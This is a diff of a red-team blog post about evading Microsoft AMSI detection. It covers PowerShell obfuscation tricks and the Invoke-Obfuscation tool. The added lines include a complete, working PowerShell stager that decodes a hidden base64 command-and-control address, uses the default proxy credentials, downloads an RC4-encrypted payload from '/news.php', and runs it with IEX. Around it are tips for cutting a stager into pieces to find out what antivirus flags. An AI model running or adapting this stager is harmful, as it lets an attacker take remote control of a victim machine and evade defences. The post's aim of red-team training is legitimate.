@@ -132,31 +132,28 @@ Powershell is ignoring capitalization. Every antivirus/antimalware solution is h
 </div>
 Even if AMSI is ignoring capitalization, changing the payload's hash is a good practice.
 
-
-<b>2.Concatenation</b><br/>
+<br/><b>2.Concatenation</b><br/>
 AMSI is still heavily dependent upon signatures, however simple concatenation can prevent most alerts. Microsoft has implemented a custom EICAR string 'amsicontext' for testing the AMSI's detection capabilities.
 <div>
 <center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/concat.png">
  </center>
 </div>
 
-
-<b>3.Variable Insertion</b><br/>
+<br/><b>3.Variable Insertion</b><br/>
 Powershell recognizes $ as a special character in a string and will fetch the associated variable.
 <div>
 <img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/insertion.png">
 </div>
 
-<b>4.Format String</b><br/>
+<br/><b>4.Format String</b><br/>
 Powershell allows for the use of {} inside a string to allow for variable insertion. This is an reference to the format string function.
 <div>
 <center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/formatstring.png">
  </center>
 </div>
 
-
-<br/> The list of obfuscation methods can continue from compressing the code to encrypting it, etc.<br/>
-Also a good tip, is to break large section of code into smaller pieces and test them in part in order to determine what is being flagged in your stager.
+As you can see, AMSI is still not perfect in detecting all of above examples, maybe in time it will can. The list of obfuscation methods can continue from compressing the code to encrypting it, etc.<br/>
+Also a good tip, is to break large section of code into smaller pieces and test them in part in order to determine what is being flagged in your stager when you develop the obfuscation.
 <br/> However I promised that we will make use of multiple open source tools for achieving our goal and not losing to much time on development.
 
 A script will come in play in our aid when it comes obfuscation, so lets Invoke-Obfuscation!
@@ -164,3 +161,16 @@ A script will come in play in our aid when it comes obfuscation, so lets Invoke-
 ## Invoke-Obfuscation {#invokeobfuscation}
 If you have not already viewed Daniel Bohannon's presentations about <a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener noreferrer">Invoke-Obfuscation </a>, I invite you to take a look at the following <a href="https://www.youtube.com/watch?v=uE8IAxM_BhE" target="_blank" rel="noopener noreferrer">presentation1 </a> or <a href="https://www.youtube.com/watch?v=k5ToL0J7uL0" target="_blank" rel="noopener noreferrer">presentation2 </a>.
 
+<div>
+<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/invo1.png">
+ </center>
+</div>
+
+"ScriptPath" is setting the path for reading the content from a file, in my case will be "/tmp/test.ps1", where test.ps1 is containing the following code:
+
+{% highlight powershell %}
+$ErrorActionPreference = "SilentlyContinue";$ebDd=NEW-ObjecT SySteM.NET.WeBCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TEXt.ENCODInG]::UNICoDe.GeTStRiNG([ConVert]::FrOmBaSe64STRIng('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA2ADAALgAxADMANAA6ADgAMAA=')));$t='/news.php';$EbdD.HeADErS.ADD('User-Agent',$u);$EBdD.ProXy=[SySTem.Net.WebREqUEst]::DeFaulTWEbPrOXy;$EBdD.PrOXY.CredEnTIALs = [SYsTem.NET.CredenTIAlCACHe]::DeFauLtNetWoRKCreDenTIAls;$Script:Proxy = $ebdd.Proxy;$K=[SySTeM.Text.ENcOdiNG]::ASCII.GEtBytEs('*VWR/g_v[59+~38qlKjd6(hcws|#ON0B');$R={$D,$K=$ARgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxOR$S[($S[$I]+$S[$H])%256]}};$eBdd.HEadErS.ADD("Cookie","bBxqmHhF=Xw9FMjBYWNyNHKSPRXrSEYxLcPA=");$DAtA=$ebDD.DOWnlOAdDaTA($ser+$T);$IV=$daTA[0..3];$DAtA=$DATA[4..$DAtA.LENGth];-joiN[CHAr[]](& $R $dATA ($IV+$K))|IEX
+
+{% endhighlight %}
+
+Without entering in to many details about it, lets see a little about its obfuscation techniques:
